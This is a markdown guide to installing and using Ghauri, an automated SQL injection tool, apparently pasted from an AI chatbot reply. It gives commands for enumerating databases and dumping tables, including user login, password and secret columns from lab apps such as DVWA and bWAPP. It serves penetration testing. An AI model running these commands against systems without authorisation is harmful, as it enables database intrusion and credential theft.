# 🚀 Ghauri – Advanced SQL Injection Tool Guide

> 🔥 **Ghauri** is a cross-platform tool that automates detection and exploitation of SQL Injection vulnerabilities.

🔗 GitHub: [https://github.com/r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri)

---

# 📦 Installation

---

## ⚡ 1) Quick Method – Clone Only

git clone https://github.com/r0oth3x49/ghauri.git  
cd ghauri  
ls

Run directly:

python3 ghauri.py -h

Example:

python3 ghauri.py -u "https://target/?id=1"

---

## 🛡 2) Recommended Method – Install with pipx (Isolated & Safe)

### 📌 Install prerequisites

sudo apt update  
sudo apt install -y git python3 python3-pip pipx

### 📌 Ensure pipx path

pipx ensurepath

### 📌 Install ghauri

pipx install "git+https://github.com/r0oth3x49/ghauri.git"

Copy binary:

cp -v ~/.local/share/pipx/venvs/ghauri/bin/ghauri /usr/local/bin

Run:

ghauri --help

---

## 🔄 Alternative – Create System-Wide Executable

cd /path/to/ghauri  
chmod +x ghauri.py  
sudo ln -s /path/to/ghauri/ghauri.py /usr/local/bin/ghauri

Now run:

ghauri -u "https://target/?id=1"

---

# 🧰 Basic Usage

---

## 🔎 Show Help

ghauri -h  
ghauri --help

---

## 🔄 Update Ghauri

ghauri --update

---

# 🎯 Specify Vulnerable Parameter

ghauri -u <URL> -p <parameter>

Example:

ghauri -u http://192.168.1.31/web-pentest/blind-injection-time-based.php?id=1 -p id --dbs

---

# 🗄 Database Enumeration Commands

---

## 📚 Enumerate All Databases

ghauri -u <URL> --dbs

Example:

ghauri -u https://target.example.com/vuln.php?id=1 --dbs

---

## 📂 List Tables in a Specific Database

ghauri -u <URL> -D <database> --tables

---

## 📑 List Columns in a Specific Table

ghauri -u <URL> -D <database> -T <table> --columns

---

## 💾 Dump Specific Columns

ghauri -u <URL> -D <database> -T <table> -C <col1,col2> --dump

---

# 🕵 Information Gathering

---

## 🏷 Retrieve DBMS Banner

ghauri -u <URL> -b

---

## 👤 Get Current DBMS User

ghauri -u <URL> --current-user

---

# 🌐 Example with Proxy & Threads

ghauri -r sqli-post1.txt --proxy "http://127.0.0.1:8080" --threads 4 --time-sec 6 --batch

---

## 🎯 Specify Parameter in Request File

ghauri -r sqli-post1.txt -p id

---

## 📚 Enumerate Databases (Request File)

ghauri -r sqli-post1.txt -p id --dbs

---

## 📂 Find Tables in Database

ghauri -r sqli-post1.txt -p id -D dvwa --tables

---

## 📑 Get Columns from Table

ghauri -r sqli-post1.txt -p id -D dvwa -T users --columns

---

## 💾 Dump User Data

ghauri -r <file> -p <param> -D <db> -T <table> -C <col1,col2> --dump

Example:

ghauri -r sqli-post.txt -p title -D bWAPP -T users -C id,login,email,password,secret,activated,admin --dump

---

# ⚠️ Legal Disclaimer

> 🛑 Use Ghauri only on systems you own or have explicit permission to test.  
> Unauthorized testing is illegal.

---

# 🏁 Summary

✔ Installation (Clone / pipx)  
✔ Basic Scanning  
✔ Database Enumeration  
✔ Dumping Data  
✔ Proxy & Threads Support

---

If you want, I can also make:

- 🔥 A hacker-style dark theme version
    
- 📘 A professional pentesting documentation version
    
- 🎨 A README.md GitHub-ready version
    
- 📄 A printable PDF version
    

Just tell me 😎